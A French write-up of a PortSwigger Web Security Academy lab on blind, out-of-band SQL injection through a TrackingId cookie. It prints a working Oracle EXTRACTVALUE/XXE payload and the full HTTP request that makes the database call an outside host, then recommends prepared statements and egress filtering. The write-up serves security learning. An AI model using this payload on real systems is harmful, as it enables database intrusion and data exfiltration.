# 💉 Lab : Blind SQL injection with out-of-band interaction
**Catégorie :** Injection SQL (SQLi)
**Type :** Blind SQLi (Out-Of-Band / OAST / Asynchrone)
**Plateforme :** PortSwigger Web Security Academy

---

## 📌 Résumé de la Vulnérabilité
L'application est vulnérable à une injection SQL en aveugle via le cookie `TrackingId`. La particularité de ce laboratoire est que la requête backend est exécutée de manière **asynchrone**. Il est donc impossible de voir un changement sur la page (Boolean-Based) ou de mesurer un délai de réponse (Time-Based), car le serveur web n'attend pas le résultat de la base de données pour répondre. La seule méthode d'exploitation est l'interaction "Out-Of-Band" (OAST) : forcer le moteur de base de données à émettre une requête réseau (DNS/HTTP) vers un serveur contrôlé par l'attaquant.

## 🛠️ Preuve de Concept (PoC)
La compromission a nécessité l'utilisation de techniques spécifiques au moteur **Oracle** et une gestion minutieuse de l'encodage URL.

1. **Identification de l'asynchronisme :**
   Les tentatives d'injections basées sur le temps (ex: `pg_sleep(10)`, `WAITFOR DELAY`) n'ont généré aucun délai, confirmant que le processus backend s'exécute en arrière-plan (asynchrone).

2. **Création du Payload OAST (Oracle) :**
   Pour forcer la base de données Oracle à interagir avec l'extérieur, une vulnérabilité d'entité externe XML (XXE) a été injectée dans la fonction `EXTRACTVALUE`. La requête demande au serveur de résoudre le nom de domaine `oastify.com` (le serveur public PortSwigger).
   - *Payload brut :* `'||(SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://oastify.com/"> %remote;]>'),'/l') FROM dual)--`

3. **Résolution du problème d'encodage (Le Piège HTTP) :**
   Le payload contenant des caractères spéciaux (`<`, `>`, `?`, `"`, `'`), il générait une erreur 500 s'il était envoyé en clair.
   - *Erreur d'exploitation initiale :* L'encodage de l'intégralité de l'en-tête `Cookie` a corrompu le jeton `session`, empêchant le serveur de traiter la requête.
   - *Correction :* Seule la valeur du paramètre `TrackingId` a été URL-encodée (via `Ctrl+U` dans Burp Suite), laissant le cookie `session` intact.

4. **Exécution de l'attaque :**
   
    GET / HTTP/2
    Host: 0a7f00b604cb6a3b820f657000d600d8.web-security-academy.net
    Cookie: TrackingId=jz0NufKEviNBIenj%27%7C%7C(SELECT+EXTRACTVALUE(xmltype('%3C%3Fxml+version%3D%221.0%22+encoding%3D%22UTF-8%22%3F%3E%3C!DOCTYPE+root+[+%3C!ENTITY+%25+remote+SYSTEM+%22http%3A%2F%2Foastify.com%2F%22%3E+%25remote%3B]%3E')%2C'%2Fl')+FROM+dual)--; session=IM2GpoIz0qYOwTgQM6CWdenPNzvxMBB0

5. **Résultat :**
   La base de données a effectué une requête DNS vers `oastify.com`, prouvant l'exécution de l'injection SQL et validant le laboratoire.

## 🛡️ Recommandation de Sécurité
1. **Requêtes Préparées :** Implémenter des Prepared Statements pour éviter l'injection de commandes arbitraires.
2. **Filtrage Egress (Network) :** Restreindre les flux réseau sortants (Egress Traffic) du serveur de base de données. Un serveur SQL interne ne devrait pas avoir le droit de résoudre des noms de domaine publics (DNS) ou d'initier des requêtes HTTP vers Internet.